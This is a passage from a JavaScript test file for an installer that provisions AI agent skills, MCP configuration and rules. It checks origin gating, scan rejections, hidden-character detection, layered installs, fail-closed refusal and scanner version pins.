  rmSync(join(backdoorData, 'user/omp/agent/skills/hidsnap/notes.md'));
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(gotRule('.omp/agent/skills/hidsnap/SKILL.md'), skillText('hidsnap'), 'the repaired skill installs again');

  // The origin gate (upstreams.json) is judged per item: a skill with no recorded origin is
  // left out and reported, the covered items install, an uncovered MCP server is only a
  // report (mcp.json itself still installs), and a broken gate refuses the whole run.
  if (scanned) {
    const ogData = join(tmp, 'data-origin');
    const ogHome = join(tmp, 'home-origin');
    const putO = (rel, text) => { mkdirSync(dirname(join(ogData, 'user', rel)), { recursive: true }); writeFileSync(join(ogData, 'user', rel), text); };
    putO('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
    putO('omp/agent/skills/covered/SKILL.md', skillText('covered'));
    putO('omp/agent/skills/orphan/SKILL.md', skillText('orphan'));
    putO('omp/agent/mcp.json', JSON.stringify({ mcpServers: { mystery: { command: 'unknown-mcp-server' } } }));
    const writeUpstreams = payload => writeFileSync(join(ogData, 'upstreams.json'), `${JSON.stringify(payload, null, 2)}\n`);
    writeUpstreams({ items: [{ name: 'skills', kind: 'skill', origin: 'https://github.com/example/repo', paths: ['user/omp/agent/skills/covered'] }], own: [] });
    writeStub(0);
    r = run(['--data', ogData, '--skip-plugins'], ogHome);
    assert.equal(r.status, 1, 'an uncovered origin fails the run but not the install');
    assert.ok(existsSync(join(ogHome, '.omp/agent/skills/covered/SKILL.md')), 'the covered skill installs');
    assert.ok(!existsSync(join(ogHome, '.omp/agent/skills/orphan')), 'the uncovered skill never lands');
    assert.ok(r.stdout.includes('user/omp/agent/skills/orphan — no origin'), 'the uncovered skill is reported');
    assert.ok(r.stdout.includes('user/omp/agent/mcp.json "mystery" — no origin'), 'the uncovered MCP server is reported');
    assert.ok(existsSync(join(ogHome, '.omp/agent/mcp.json')), 'mcp.json itself still installs');
    // Losing coverage deletes a previously installed, record-matching copy.
    writeUpstreams({ items: [{ name: 'skills', kind: 'skill', origin: 'https://github.com/example/repo', paths: [] }], own: [] });
    r = run(['--data', ogData, '--skip-plugins'], ogHome);
    assert.equal(r.status, 1);
    assert.ok(!existsSync(join(ogHome, '.omp/agent/skills/covered')), 'the now-uncovered installed copy is deleted');
    assert.ok(r.stdout.includes('user/omp/agent/skills/covered — no origin'), 'the lost coverage is reported');
    // An unreadable upstreams.json refuses the whole run: no origin verdict is possible.
    writeFileSync(join(ogData, 'upstreams.json'), '{');
    const ogFatalHome = join(tmp, 'home-origin-fatal');
    r = run(['--data', ogData, '--skip-plugins'], ogFatalHome);
    assert.equal(r.status, 1);
    assert.match(r.stderr, /Nothing installed\. Fix:/);
    assert.ok(!existsSync(ogFatalHome), 'a broken origin gate writes nothing');
    // A structurally broken entry refuses too.
    writeUpstreams({ items: [{ name: 'x', kind: 'no-such-kind', origin: 'https://github.com/a/b' }] });
    r = run(['--data', ogData, '--skip-plugins'], ogFatalHome);
    assert.equal(r.status, 1);
    assert.match(r.stderr, /unknown kind/);
    assert.ok(!existsSync(ogFatalHome), 'a structurally broken gate writes nothing');
  }

  // The machine-readable results file: with ALATE_PROVISION_RESULTS set, every run writes
  // one JSON payload — success, per-item failures, and fatal refusals alike.
  if (scanned) {
    const rfData = join(tmp, 'data-results');
    const rfHome = join(tmp, 'home-results');
    const putR = (rel, text) => { mkdirSync(dirname(join(rfData, 'user', rel)), { recursive: true }); writeFileSync(join(rfData, 'user', rel), text); };
    putR('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
    putR('omp/agent/skills/fine/SKILL.md', skillText('fine'));
    putR('omp/plugins/package.json', '{"dependencies":{}}\n');
    putR('omp/plugins/bun.lock', '{}\n');
    mkdirSync(join(rfData, 'workers', 'web'), { recursive: true });
    writeFileSync(join(rfData, 'workers', 'web', 'apt.txt'), 'libnss3\n');
    const resultsPath = join(tmp, 'results-user.json');
    const withResults = { ALATE_PROVISION_RESULTS: resultsPath };
    writeStub(0);
    // Success: fatal false, one entry per item, worker and plugin entries included.
    r = run(['--data', rfData, '--skip-plugins'], rfHome, { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: join(tmp, 'no-venv'), ...withResults });
    assert.equal(r.status, 0, r.stderr);
    let results = JSON.parse(readFileSync(resultsPath, 'utf8'));
    assert.equal(results.fatal, false);
    assert.equal(results.error, null);
    const byKey = Object.fromEntries(results.items.map(i => [i.item, i.status]));
    assert.equal(byKey['user/omp/agent/config.yml'], 'installed');
    assert.equal(byKey['user/omp/agent/skills/fine'], 'installed');
    assert.equal(byKey['user/omp/plugins'], 'unchanged', 'skipped plugins report unchanged');
    assert.equal(byKey['workers/web/apt.txt'], 'installed');
    // Per-item failure: fatal stays false, the rejected item carries rule, position, report.
    putR('omp/agent/skills/bad-r/SKILL.md', skillText('bad-r'));
    writeStub(0, 'SkillSpector v2.13.0', ['bad-r']);
    rmSync(resultsPath, { force: true });
    r = run(['--data', rfData, '--skip-plugins'], rfHome, { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: join(tmp, 'no-venv'), ...withResults });
    assert.equal(r.status, 1);
    results = JSON.parse(readFileSync(resultsPath, 'utf8'));
    assert.equal(results.fatal, false);
    const bad = results.items.find(i => i.item === 'user/omp/agent/skills/bad-r');
    assert.equal(bad.status, 'rejected');
    assert.equal(bad.rule, 'SC2');
    assert.equal(bad.at, 'SKILL.md:7');
    assert.ok(bad.report.includes('SC2'), 'the report text travels with the item');
    assert.equal(results.items.find(i => i.item === 'user/omp/agent/skills/fine').status, 'unchanged');
    // Fatal refusal: fatal true with the error, items from before the refusal.
    rmSync(resultsPath, { force: true });
    r = run(['--data', rfData, '--skip-plugins'], rfHome, { PATH: '/usr/bin:/bin', SKILLSPECTOR_VENV: join(tmp, 'no-venv'), SKILLSPECTOR_BIN: '', ALATE_DATA: join(tmp, 'no-aldata'), ALATE_PROVISION_RESULTS: resultsPath, HOME: childHome, USERPROFILE: childHome });
    assert.equal(r.status, 1);
    results = JSON.parse(readFileSync(resultsPath, 'utf8'));
    assert.equal(results.fatal, true);
    assert.match(results.error, /skillspector not found/);
  }

  // Layer mode per item: a skill the layer scan rejects is removed from the fresh layer and
  // from the manifest before the switch, and the layer still goes live; a nested sync
  // per-item failure keeps the layer but marks the run failed.
  if (scanned) {
    const lData = join(tmp, 'data-layer-item');
    const lHome = join(tmp, 'home-layer-item');
    const putL = (rel, text) => { mkdirSync(dirname(join(lData, 'user', rel)), { recursive: true }); writeFileSync(join(lData, 'user', rel), text); };
    putL('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
    putL('omp/agent/skills/good-l/SKILL.md', skillText('good-l'));
    putL('omp/agent/skills/bad-l/SKILL.md', skillText('bad-l'));
    writeStub(0, 'SkillSpector v2.13.0', ['bad-l']);
    r = run(['--data', lData, '--skip-plugins', '--layer'], lHome);
    assert.equal(r.status, 1, 'the layer rejection fails the run');
    const lLayer = realpathSync(join(lHome, '.alate', 'current'));
    assert.ok(existsSync(join(lLayer, '.omp/agent/skills/good-l/SKILL.md')), 'the good skill installs into the layer');
    assert.ok(!existsSync(join(lLayer, '.omp/agent/skills/bad-l')), 'the rejected skill is removed from the fresh layer');
    const lRecord = JSON.parse(readFileSync(join(lLayer, '.alate', 'installed.json'), 'utf8'));
    assert.ok(!Object.keys(lRecord).some(rel => rel.startsWith('omp/agent/skills/bad-l')), 'the manifest never names a file the layer lacks');
    assert.ok(r.stdout.includes('user/omp/agent/skills/bad-l — rejected: SC2 at SKILL.md:7'), 'the layer rejection is reported');
    assert.ok(r.stdout.includes('switched'), 'the layer still switches');
    // A nested sync per-item failure (a hidden-character rule in the data root) does not
    // abort the layer: the good rules stay, the bad one is reported, the run exits 1.
    const lResults = join(tmp, 'results-layer.json');
    writeFileSync(join(lData, 'oops.md'), 'Bad\u202Erule\n');
    rmSync(lResults, { force: true });
    r = run(['--data', lData, '--skip-plugins', '--layer'], lHome, {
      ...process.env,
      PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`,
      SKILLSPECTOR_VENV: join(tmp, 'no-venv'),
      ALATE_PROVISION_RESULTS: lResults,
    });
    assert.equal(r.status, 1, 'a nested per-item failure keeps the run failed');
    const lLayer2 = realpathSync(join(lHome, '.alate', 'current'));
    assert.ok(existsSync(join(lLayer2, '.omp/agent/rules/zai-glm.md')) || readdirSync(join(lLayer2, '.omp/agent/rules')).length > 0, 'the good rules still land in the layer');
    const nested = JSON.parse(readFileSync(lResults, 'utf8'));
    assert.equal(nested.fatal, false);
    assert.ok(nested.items.some(i => i.item === 'oops.md' && i.status === 'rejected'), 'the nested rejection merges into the results items');
  }


  // Shipped skills (specs/shipped-skills.md, Acceptance 1-4): the vendored Ottr skills
  // install into every home, a data repo skill of the same name wins, a scan rejection
  // fails only that item, and machine state follows the snapshot rules.
  if (scanned) {
    const shData = join(tmp, 'data-shipped');
    const shPut = (rel, text) => { mkdirSync(dirname(join(shData, 'user', rel)), { recursive: true }); writeFileSync(join(shData, 'user', rel), text); };
    const shippedNames = readdirSync(shippedSkillsRoot, { withFileTypes: true }).filter(e => e.isDirectory()).map(e => e.name).sort();
    const vendoredBytes = name => readFileSync(join(scriptDir, 'shipped', 'ottr', '.agents', 'skills', name, 'SKILL.md'), 'utf8');
    const shEnv = results => ({ ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: join(tmp, 'no-venv'), ...(results ? { ALATE_PROVISION_RESULTS: results } : {}) });
    writeStub(0);

    // Acceptance 1: an empty data repo (no skills) provisions every shipped skill with
    // the pinned bytes, and the per-item results name each one as installed.
    shPut('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
    const shHome = join(tmp, 'home-shipped');
    const shResults = join(tmp, 'results-shipped.json');
    r = run(['--data', shData, '--skip-plugins'], shHome, shEnv(shResults));
    assert.equal(r.status, 0, r.stderr);
    for (const name of shippedNames) {
      assert.equal(readFileSync(join(shHome, '.agents/skills', name, 'SKILL.md'), 'utf8'), vendoredBytes(name), `${name} lands with the pinned bytes`);
    }
    let shRes = JSON.parse(readFileSync(shResults, 'utf8'));
    for (const name of shippedNames) {
      assert.equal(shRes.items.find(i => i.item === `user/agents/skills/${name}`)?.status, 'installed', `${name} reports installed`);
    }
    rmSync(shResults, { force: true });
    r = run(['--data', shData, '--skip-plugins'], shHome, shEnv(shResults));
    assert.equal(r.status, 0, r.stderr);
    shRes = JSON.parse(readFileSync(shResults, 'utf8'));
    for (const name of shippedNames) {
      assert.equal(shRes.items.find(i => i.item === `user/agents/skills/${name}`)?.status, 'unchanged', `${name} reports unchanged on the rerun`);
    }

    // Acceptance 2: a data repo skill of the same name wins — its bytes land, the shipped
    // copy of that name is skipped with the log line, the other three still install.
    shPut('omp/agent/skills/check-ottr-board/SKILL.md', skillText('check-ottr-board', '# own board skill\n'));
    writeFileSync(join(shData, 'upstreams.json'), `${JSON.stringify({ items: [{ name: 'skills', kind: 'skill', origin: 'https://github.com/example/repo', paths: ['user/omp/agent/skills/check-ottr-board'] }], own: [] }, null, 2)}\n`);
    const shHome2 = join(tmp, 'home-shipped-own');
    r = run(['--data', shData, '--skip-plugins'], shHome2);
    assert.equal(r.status, 0, r.stderr);
    assert.equal(readFileSync(join(shHome2, '.omp/agent/skills/check-ottr-board/SKILL.md'), 'utf8'), skillText('check-ottr-board', '# own board skill\n'), 'the data repo copy lands');
    assert.ok(!existsSync(join(shHome2, '.agents/skills/check-ottr-board')), 'the shipped copy of that name stays out');
    assert.ok(r.stdout.includes('shipped skill check-ottr-board skipped: the data repo has its own copy'), r.stdout);
    for (const name of shippedNames.filter(n => n !== 'check-ottr-board')) {
      assert.equal(readFileSync(join(shHome2, '.agents/skills', name, 'SKILL.md'), 'utf8'), vendoredBytes(name), `${name} still installs`);
    }

    // Acceptance 3: a scan rejection of one shipped skill fails only that item; the others
    // install and the run exits 1 like any rejected-skill run.
    writeStub(0, 'SkillSpector v2.13.0', ['ui-ux-check']);
    const shHome3 = join(tmp, 'home-shipped-reject');
    const shResults3 = join(tmp, 'results-shipped-reject.json');
    r = run(['--data', shData, '--skip-plugins'], shHome3, shEnv(shResults3));
    assert.equal(r.status, 1, 'the scan rejection fails the run');
    assert.ok(r.stdout.includes('user/agents/skills/ui-ux-check — rejected: SC2 at SKILL.md:7'), r.stdout);
    assert.ok(!existsSync(join(shHome3, '.agents/skills/ui-ux-check')), 'the rejected shipped skill never lands');
    const shRes3 = JSON.parse(readFileSync(shResults3, 'utf8'));
    assert.equal(shRes3.fatal, false, 'a per-skill shipped rejection is not a whole-run refusal');
    assert.equal(shRes3.items.find(i => i.item === 'user/agents/skills/ui-ux-check').rule, 'SC2');
    for (const name of shippedNames.filter(n => n !== 'ui-ux-check' && n !== 'check-ottr-board')) {
      assert.equal(readFileSync(join(shHome3, '.agents/skills', name, 'SKILL.md'), 'utf8'), vendoredBytes(name), `${name} installs beside the rejected one`);
    }
    assert.ok(!existsSync(join(shHome3, '.agents/skills/check-ottr-board')), 'the data-repo shadow keeps the shipped copy out here too');

    // Acceptance 3b: a hidden character in a non-entrypoint Markdown file fails the whole
    // shipped skill under its skill key, like the snapshot walk. The folder is removed
    // again so later tree counts keep seeing the vendored set.
    const hiddenProbe = join(shippedSkillsRoot, 'hidden-probe');
    try {
      mkdirSync(hiddenProbe, { recursive: true });
      writeFileSync(join(hiddenProbe, 'SKILL.md'), skillText('hidden-probe'));
      writeFileSync(join(hiddenProbe, 'notes.md'), 'notes\u202Efile\n');
      writeStub(0);
      const shHome3b = join(tmp, 'home-shipped-hidden');
      r = run(['--data', shData, '--skip-plugins'], shHome3b);
      assert.equal(r.status, 1, 'a hidden character in a shipped skill folder fails the whole skill');
      assert.ok(r.stdout.includes('user/agents/skills/hidden-probe — rejected: hidden character U+202E at user/agents/skills/hidden-probe/notes.md:1:6'), r.stdout);
      assert.ok(!/^ {2}user\/agents\/skills\/hidden-probe\//m.test(r.stdout), 'the shipped skill reports once under its skill key, never per file');
      assert.ok(!existsSync(join(shHome3b, '.agents/skills/hidden-probe')), 'the rejected shipped skill never half-installs');
      for (const name of shippedNames.filter(n => n !== 'check-ottr-board')) {
        assert.equal(readFileSync(join(shHome3b, '.agents/skills', name, 'SKILL.md'), 'utf8'), vendoredBytes(name), `${name} installs beside the hidden-rejected one`);
      }
    } finally {
      rmSync(hiddenProbe, { recursive: true, force: true });
    }

    // Acceptance 4: machine state follows the snapshot rules. A machine-changed shipped
    // skill refuses the in-place install; --force restores the shipped bytes; layer mode
    // keeps the machine copy.
    const changed = '# explain-project skill, changed on the machine\n';
    writeStub(0);
    writeFileSync(join(shHome, '.agents/skills/explain-project/SKILL.md'), changed);
    r = run(['--data', shData, '--skip-plugins'], shHome);
    assert.equal(r.status, 1, 'a machine-changed shipped skill refuses the in-place install');
    assert.ok(r.stderr.includes(join(shHome, '.agents/skills/explain-project/SKILL.md')), r.stderr);
    assert.equal(readFileSync(join(shHome, '.agents/skills/explain-project/SKILL.md'), 'utf8'), changed, 'the refusal leaves the machine file alone');
    r = run(['--data', shData, '--force', '--skip-plugins'], shHome);
    assert.equal(r.status, 0, r.stderr);
    assert.equal(readFileSync(join(shHome, '.agents/skills/explain-project/SKILL.md'), 'utf8'), vendoredBytes('explain-project'), '--force restores the shipped bytes');
    writeFileSync(join(shHome, '.agents/skills/explain-project/SKILL.md'), changed);
    const shLayerHome = join(tmp, 'home-shipped-layer');
    r = run(['--data', shData, '--skip-plugins', '--layer'], shLayerHome);
    assert.equal(r.status, 0, r.stderr);
    writeFileSync(join(realpathSync(join(shLayerHome, '.alate', 'current')), '.agents/skills/explain-project/SKILL.md'), changed);
    r = run(['--data', shData, '--skip-plugins', '--layer'], shLayerHome);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /machine change kept: .*explain-project/);
    assert.equal(readFileSync(join(realpathSync(join(shLayerHome, '.alate', 'current')), '.agents/skills/explain-project/SKILL.md'), 'utf8'), changed, 'layer mode keeps the machine copy');
    writeStub(0);

    // Acceptance 5: the whole vendored tree is the source — a skill folder added to the
    // vendored tree installs with no code change, and reports installed per item. The
    // folder is removed again so any later test that counts the tree keeps seeing the
    // vendored set; the tests above computed their counts from the vendored tree.
    const fifth = join(shippedSkillsRoot, 'fifth-probe');
    try {
      mkdirSync(fifth, { recursive: true });
      const fifthBytes = '---\nname: fifth-probe\ndescription: Test skill\n---\n# fifth-probe\n';
      writeFileSync(join(fifth, 'SKILL.md'), fifthBytes);
      const shHome5 = join(tmp, 'home-shipped-fifth');
      const shResults5 = join(tmp, 'results-shipped-fifth.json');
      r = run(['--data', shData, '--skip-plugins'], shHome5, shEnv(shResults5));
      assert.equal(r.status, 0, r.stderr);
      assert.equal(readFileSync(join(shHome5, '.agents/skills/fifth-probe/SKILL.md'), 'utf8'), fifthBytes, 'the added vendored skill installs without any code change');
      const shRes5 = JSON.parse(readFileSync(shResults5, 'utf8'));
      assert.equal(shRes5.items.find(i => i.item === 'user/agents/skills/fifth-probe')?.status, 'installed', 'fifth-probe reports installed');
    } finally {
      rmSync(fifth, { recursive: true, force: true });
    }

    // Acceptance 6 (fail closed): the vendored tree is load-bearing. With the tree gone,
    // a run without it would treat the shipped skills already in the home as obsolete and
    // delete them, so the installer refuses before any write or deletion.
    const shHome6 = join(tmp, 'home-shipped-failclosed');
    const shResults6 = join(tmp, 'results-shipped-failclosed.json');
    // check-ottr-board stays shadowed by the data repo copy from Acceptance 2, so it is
    // never in this home; the fail-closed assertions cover the shipped names that install.
    const installed6 = shippedNames.filter(n => n !== 'check-ottr-board');
    r = run(['--data', shData, '--skip-plugins'], shHome6, shEnv(shResults6));
    assert.equal(r.status, 0, r.stderr);
    const before6 = Object.fromEntries(installed6.map(name => [name, readFileSync(join(shHome6, '.agents/skills', name, 'SKILL.md'), 'utf8')]));
    const vendoredTree = join(scriptDir, 'shipped', 'ottr');
    try {
      rmSync(vendoredTree, { recursive: true, force: true });
      rmSync(shResults6, { force: true });
      r = run(['--data', shData, '--skip-plugins'], shHome6, shEnv(shResults6));
      assert.equal(r.status, 1, 'a missing vendored tree refuses the run');
      assert.match(r.stderr, /shipped\/ottr\/\.agents\/skills is missing or unreadable/, r.stderr);
      const shRes6 = JSON.parse(readFileSync(shResults6, 'utf8'));
      assert.equal(shRes6.fatal, true, 'the refusal is a whole-run refusal');
      assert.match(shRes6.error, /refusing to install/);
      for (const name of installed6) {
        assert.ok(existsSync(join(shHome6, '.agents/skills', name, 'SKILL.md')), `${name} survives the refused run`);
        assert.equal(readFileSync(join(shHome6, '.agents/skills', name, 'SKILL.md'), 'utf8'), before6[name], `${name} keeps its bytes through the refused run`);
      }
    } finally {
      copyTree(fileURLToPath(new URL('./shipped/ottr', import.meta.url)), vendoredTree);
    }

    // Acceptance 7 (fail closed, layer mode): with the tree gone, a --layer run refuses
    // before any layer is created or switched.
    const shLayerHome7 = join(tmp, 'home-shipped-layer-failclosed');
    r = run(['--data', shData, '--skip-plugins', '--layer'], shLayerHome7);
    assert.equal(r.status, 0, r.stderr);
    const priorLayer7 = realpathSync(join(shLayerHome7, '.alate', 'current'));
    try {
      rmSync(vendoredTree, { recursive: true, force: true });
      r = run(['--data', shData, '--skip-plugins', '--layer'], shLayerHome7);
      assert.equal(r.status, 1, 'a --layer run without the vendored tree refuses');
      assert.match(r.stderr, /shipped\/ottr\/\.agents\/skills is missing or unreadable/, r.stderr);
      assert.equal(realpathSync(join(shLayerHome7, '.alate', 'current')), priorLayer7, '.alate/current still points at the previous layer');
      const layerDirs7 = readdirSync(join(shLayerHome7, '.alate', 'layers'));
      assert.equal(layerDirs7.length, 1, 'no new layer folder was created');
    } finally {
      copyTree(fileURLToPath(new URL('./shipped/ottr', import.meta.url)), vendoredTree);
    }
  }

  // The server image must carry the scanner the gate refuses to run without; the two pins
  // must not drift (an unpinned image made every containerized provision fail). Under the
  // mutation gate the sandbox copy of install-user.mjs is instrumented: the pin literal
  // sits inside a mutant switch on the declaration line, so take the last v-prefixed
  // literal of the line (the original value) instead of matching the whole statement.
  const source = readFileSync(fileURLToPath(new URL('./install-user.mjs', import.meta.url)), 'utf8');
  const decl = source.match(/const SKILLSPECTOR_REF[^\n]*/)?.[0] ?? '';
  const pins = decl.match(/v\d+(?:\.\d+)*/g) ?? [];
  const ref = pins[pins.length - 1];
  assert.ok(ref, 'install-user.mjs pins SKILLSPECTOR_REF');
  assert.ok(
    readFileSync(fileURLToPath(new URL('./Dockerfile', import.meta.url)), 'utf8').includes(`ARG SKILLSPECTOR_REF=${ref}`),
    `Dockerfile must carry the pinned build install-user.mjs requires (${ref})`,
  );
  assert.ok(
    readFileSync(fileURLToPath(new URL('.github/workflows/install.yml', import.meta.url)), 'utf8').includes(`SKILLSPECTOR_REF: ${ref}`),
    `.github/workflows/install.yml must install the pinned build install-user.mjs requires (${ref})`,
  );

  console.log('install-user.mjs ok');
} finally {
  if (!keepTemp()) rmSync(tmp, { recursive: true, force: true });
}
